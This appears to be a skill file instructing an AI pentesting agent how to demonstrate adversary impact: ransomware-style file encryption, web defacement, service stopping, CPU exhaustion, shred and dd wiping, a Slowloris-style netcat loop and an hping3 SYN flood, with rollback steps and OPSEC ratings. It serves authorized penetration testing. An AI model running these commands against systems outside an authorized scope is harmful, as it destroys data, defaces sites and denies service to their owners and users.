---
name: impact
description: Demonstrate potential adversary impact through controlled simulations — ransomware, defacement, service disruption, resource hijacking, data destruction proof, and denial of service testing. Evidence-only by default.
---

# Impact (TA0040)

## Overview
Impact techniques demonstrate the potential for adversaries to disrupt availability,
destroy data, or compromise integrity of target systems. In penetration testing,
impact is demonstrated through controlled simulations that prove capability without
causing actual damage to production systems.

## ⚠️ CRITICAL SAFETY RULES
1. **Evidence-only by default.** Never execute destructive actions without explicit written authorization.
2. **Always have a rollback plan** before any impact demonstration.
3. **Test files only.** Ransomware simulation uses attacker-created test files, never production data.
4. **Document capability** — prove you CAN, don't prove you DID (unless authorized).
5. **Time-boxed.** Service disruption must have a maximum duration and immediate restore plan.
6. **Scope validation.** Confirm impact testing is in-scope before every action.

## Methodology

### Phase 1: Impact Assessment
Before any impact demonstration, assess and document:
1. What systems are in scope for impact testing?
2. What is the authorized impact level? (evidence-only / controlled / full)
3. What rollback mechanisms exist? (backups, snapshots, service restart)
4. What is the maximum acceptable downtime?
5. Who is the emergency contact if something goes wrong?

### Phase 2: Ransomware Simulation (T1486)
Demonstrate file encryption capability using test files only:

```bash
# Step 1: Create test directory with sample files
mkdir -p /tmp/ransomware_test/documents
for i in $(seq 1 10); do
    echo "This is test document $i - $(date)" > "/tmp/ransomware_test/documents/file_$i.txt"
    dd if=/dev/urandom bs=1024 count=$((RANDOM % 100 + 1)) of="/tmp/ransomware_test/documents/data_$i.bin" 2>/dev/null
done

# Step 2: Generate encryption key
RANSOM_KEY=$(openssl rand -hex 32)
echo "$RANSOM_KEY" > /tmp/ransomware_test/.decryption_key  # ALWAYS save the key

# Step 3: Encrypt test files (simulating ransomware)
for file in /tmp/ransomware_test/documents/*; do
    openssl enc -aes-256-cbc -salt -pbkdf2 -in "$file" -out "${file}.encrypted" -k "$RANSOM_KEY"
    mv "${file}.encrypted" "$file"  # overwrite original
done

# Step 4: Drop ransom note
cat > /tmp/ransomware_test/README_ENCRYPTED.txt << 'EOF'
=== PENETRATION TEST - RANSOMWARE SIMULATION ===
All files in this directory have been encrypted with AES-256-CBC.
This is a CONTROLLED TEST demonstrating ransomware capability.

Tester: [YOUR NAME]
Date: [DATE]
Scope: [ENGAGEMENT ID]

Decryption key is stored securely and will be provided to restore files.
=== THIS IS A TEST - NO REAL DATA WAS HARMED ===
EOF

# Step 5: Screenshot evidence
ls -la /tmp/ransomware_test/documents/
cat /tmp/ransomware_test/README_ENCRYPTED.txt
file /tmp/ransomware_test/documents/*  # show files are encrypted

# Step 6: Decrypt (rollback)
for file in /tmp/ransomware_test/documents/*; do
    openssl enc -aes-256-cbc -d -pbkdf2 -in "$file" -out "${file}.decrypted" -k "$RANSOM_KEY"
    mv "${file}.decrypted" "$file"
done

# Step 7: Verify restoration
cat /tmp/ransomware_test/documents/file_1.txt  # should be readable
```

### Phase 3: Web Defacement (T1491.002)
Demonstrate ability to modify web content, then revert:

```bash
# Step 1: Backup original page
cp /var/www/html/index.html /var/www/html/index.html.bak.$(date +%s)
sha256sum /var/www/html/index.html > /tmp/defacement_original_hash.txt

# Step 2: Screenshot original page
curl -s http://target/index.html > /tmp/original_page.html

# Step 3: Insert proof-of-concept banner (minimal change)
sed -i '1i<!-- PENTEST PROOF: Defacement capability demonstrated by [TESTER] on [DATE] -->' \
    /var/www/html/index.html

# Or replace with proof page
cat > /var/www/html/index.html << 'EOF'
<html><body style="background:#000;color:#0f0;text-align:center;padding-top:200px">
<h1>PENETRATION TEST - DEFACEMENT PROOF</h1>
<p>This page was modified to demonstrate write access to the web root.</p>
<p>Tester: [NAME] | Date: [DATE] | Engagement: [ID]</p>
<p>Original page has been backed up and will be restored.</p>
</body></html>
EOF

# Step 4: Screenshot defaced page as evidence
curl -s http://target/index.html > /tmp/defaced_page.html

# Step 5: IMMEDIATELY restore original
cp /var/www/html/index.html.bak.* /var/www/html/index.html
sha256sum /var/www/html/index.html  # verify matches original

# Step 6: Verify restoration
curl -s http://target/index.html | diff - /tmp/original_page.html
```

### Phase 4: Service Disruption (T1489)
Demonstrate ability to stop critical services:

```bash
# Step 1: Document current service state
systemctl status nginx apache2 mysql postgresql docker 2>/dev/null | \
    grep -E "Active:|Loaded:" > /tmp/service_baseline.txt

# Step 2: Demonstrate stop capability (with authorization)
# Option A: Actually stop and immediately restart
systemctl stop nginx
sleep 5  # brief disruption window
systemctl start nginx
systemctl status nginx  # verify restored

# Option B: Evidence-only — prove you COULD stop it
# Show you have permissions without actually stopping
sudo -n systemctl status nginx  # prove sudo access
whoami  # prove privilege level
cat /etc/sudoers 2>/dev/null | grep -v "^#"  # prove sudoers entry

# Step 3: Process kill demonstration
# Create a test process, kill it (not production services)
sleep 3600 &
TEST_PID=$!
kill -9 $TEST_PID  # demonstrate kill capability

# Step 4: Document impact
echo "Service disruption capability confirmed" > /tmp/service_impact.txt
echo "Privileges: $(id)" >> /tmp/service_impact.txt
echo "Sudo access: $(sudo -l 2>/dev/null | head -20)" >> /tmp/service_impact.txt
```

### Phase 5: Resource Hijacking (T1496)
Demonstrate crypto mining potential WITHOUT actually mining:

```bash
# Step 1: Prove compute access and show resource availability
nproc                          # CPU cores available
free -h                        # memory available
cat /proc/cpuinfo | grep "model name" | head -1
lscpu | grep -E "Model name|CPU\(s\)|Thread"

# Step 2: Show that mining software COULD be installed
which wget curl  # download capability
ls -la /tmp/     # writable directory
df -h /tmp/      # available disk space

# Step 3: Simulate CPU load briefly (NOT actual mining)
stress --cpu $(nproc) --timeout 10  # 10-second CPU stress test
# Or without stress tool:
timeout 10 bash -c 'for i in $(seq 1 $(nproc)); do yes > /dev/null & done; wait'

# Step 4: Document evidence
echo "Resource hijacking potential confirmed" > /tmp/resource_hijack.txt
echo "CPUs: $(nproc), RAM: $(free -h | awk '/Mem:/{print $2}')" >> /tmp/resource_hijack.txt
echo "Write access: /tmp/ confirmed" >> /tmp/resource_hijack.txt
echo "Download capability: confirmed" >> /tmp/resource_hijack.txt
# NOTE: No actual mining was performed
```

### Phase 6: Data Destruction Proof (T1485)
Prove ability to destroy data WITHOUT actually destroying anything:

```bash
# Step 1: Create test files for destruction proof
mkdir -p /tmp/destruction_test
for i in $(seq 1 5); do
    dd if=/dev/urandom bs=1024 count=10 of="/tmp/destruction_test/testfile_$i" 2>/dev/null
done

# Step 2: Demonstrate secure deletion capability
shred -vfz -n 3 /tmp/destruction_test/testfile_1
ls -la /tmp/destruction_test/  # testfile_1 is gone

# Step 3: Show dd wipe capability (on test file only!)
dd if=/dev/zero of=/tmp/destruction_test/testfile_2 bs=1024 count=10
file /tmp/destruction_test/testfile_2  # shows data is zeroed

# Step 4: Document capability against real targets (don't execute!)
echo "Data destruction capability proof:" > /tmp/destruction_evidence.txt
echo "- shred available: $(which shred)" >> /tmp/destruction_evidence.txt
echo "- dd available: $(which dd)" >> /tmp/destruction_evidence.txt
echo "- rm available: $(which rm)" >> /tmp/destruction_evidence.txt
echo "- Write access to: $(find / -writable -type d 2>/dev/null | head -10)" >> /tmp/destruction_evidence.txt
echo "NOTE: No production data was destroyed." >> /tmp/destruction_evidence.txt

# Step 5: Cleanup test files
rm -rf /tmp/destruction_test/
```

### Phase 7: Denial of Service Simulation (T1499)
Controlled resource exhaustion testing:

```bash
# Step 1: Baseline performance
curl -o /dev/null -s -w "Response time: %{time_total}s\n" http://target/

# Step 2: Application-layer DoS (controlled, low volume)
# Slowloris-style (hold connections open)
for i in $(seq 1 50); do
    (echo -ne "GET / HTTP/1.1\r\nHost: target\r\n" | nc -q 30 target 80) &
done

# Step 3: Measure degradation
curl -o /dev/null -s -w "Response time under load: %{time_total}s\n" http://target/

# Step 4: Stop test — kill all test connections
pkill -f "nc -q 30 target"

# Step 5: SYN flood proof (hping3, very brief)
timeout 5 hping3 -S --flood -p 80 target_ip  # 5 seconds MAX

# Step 6: Verify service recovered
sleep 10
curl -o /dev/null -s -w "Recovery time: %{time_total}s\n" http://target/

# Step 7: Document
echo "DoS simulation completed" > /tmp/dos_evidence.txt
echo "Baseline response: [X]s" >> /tmp/dos_evidence.txt
echo "Under load: [Y]s" >> /tmp/dos_evidence.txt
echo "Recovery: [Z]s" >> /tmp/dos_evidence.txt
```

## OPSEC Ratings Per Technique

| Technique | OPSEC | Notes |
|-----------|-------|-------|
| Resource assessment (nproc, free) | 🟢 Quiet | Normal system commands |
| Test file encryption | 🟢 Quiet | Operates on test files in /tmp only |
| Capability documentation | 🟢 Quiet | Proving access without action |
| Service stop (brief) | 🟡 Moderate | Service events logged, monitoring alerts |
| Web defacement | 🔴 Loud | Immediately visible, may trigger monitoring |
| Actual ransomware simulation | 🔴 Loud | File system activity alerts, EDR triggers |
| DoS/DDoS testing | 🔴 Loud | Network monitoring alerts, IDS triggers |
| Data destruction proof | 🟢 Quiet | Test files only, no production impact |

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| File encryption | Permission denied | Check write access, try /tmp or /dev/shm instead |
| Service stop | Service auto-restarts | Document the capability (systemctl status shows access level) |
| Defacement | Read-only filesystem | Document write access to other paths, prove capability differently |
| DoS simulation | Target auto-scales | Document the behavior — auto-scaling is a finding itself |
| Rollback fails | File not restoring | Use backup hash to verify, try from backup copy |

## Technique Chaining Playbooks

### Controlled Impact Demonstration
```
1. Impact assessment 🟢 (scope, authorization, rollback plan)
2. Create test environment 🟢 (test files in /tmp)
3. Demonstrate capability 🟢 (encrypt test files, take screenshots)
4. Document evidence 🟢 (before/after, hashes, timestamps)
5. Rollback immediately 🟢 (decrypt, restore, verify)
6. Compile findings 🟢 (what COULD be done vs what WAS done)
```

### Full Impact Assessment (Authorized)
```
1. Ransomware simulation 🟡 (test files only)
2. Service disruption proof 🟡 (brief stop/start)
3. Defacement proof 🔴 (backup → modify → restore)
4. Resource hijacking proof 🟢 (stress test, not mining)
5. Data destruction proof 🟢 (test files, shred demo)
   └── All findings → reporting skill
```

## Examples
See [examples/ransomware-simulation.md](examples/ransomware-simulation.md) for controlled encryption demo.
See [examples/service-disruption.md](examples/service-disruption.md) for service stop/start proof.
See [examples/defacement-proof.md](examples/defacement-proof.md) for web defacement and rollback.

---

## Deep Dives
Load references when needed:
1. Ransomware simulation guide: `references/ransomware_simulation.md`
2. DoS simulation techniques: `references/dos_simulation.md`
3. Web defacement proof: `references/defacement_proof.md`

## Evidence Collection
1. `impact_assessment.json` — scope, authorization level, rollback plans
2. `ransomware_proof.json` — encryption demo evidence, key location, restore confirmation
3. `defacement_proof.json` — before/after screenshots, hash verification, restore confirmation
4. `service_impact.json` — service state, stop/start evidence, restore confirmation
5. `resource_proof.json` — compute resources, hijacking potential, NO actual mining
6. `destruction_proof.json` — tool availability, write access, test file deletion only
7. `dos_results.json` — baseline, degradation, recovery measurements
8. `findings.json` — consolidated impact findings with risk ratings

## Success Criteria
- Impact capabilities demonstrated with evidence
- All demonstrations safely rolled back
- No production data destroyed or permanently modified
- Rollback verified with integrity checks
- Clear documentation of what was tested vs what could be done
